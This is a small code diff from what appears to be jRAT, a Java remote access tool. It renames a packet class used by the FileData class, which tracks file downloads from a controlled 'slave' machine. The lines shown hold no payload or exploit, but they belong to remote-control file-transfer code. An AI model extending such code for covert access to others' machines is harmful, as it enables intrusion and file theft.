@@ -4,7 +4,7 @@ import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
 
-import se.jrat.client.packets.incoming.Packet29ServerDownloadFile;
+import se.jrat.client.packets.incoming.Packet29ServerDownloadPart;
 
 
 public class FileData {
@@ -13,7 +13,7 @@ public class FileData {
 	private List<String> remoteFiles = new ArrayList<String>();
 
 	public FileData(Slave slave) {
-		Packet29ServerDownloadFile.data.put(slave, this);
+		Packet29ServerDownloadPart.data.put(slave, this);
 	}
 
 	public File getLocalFile() {
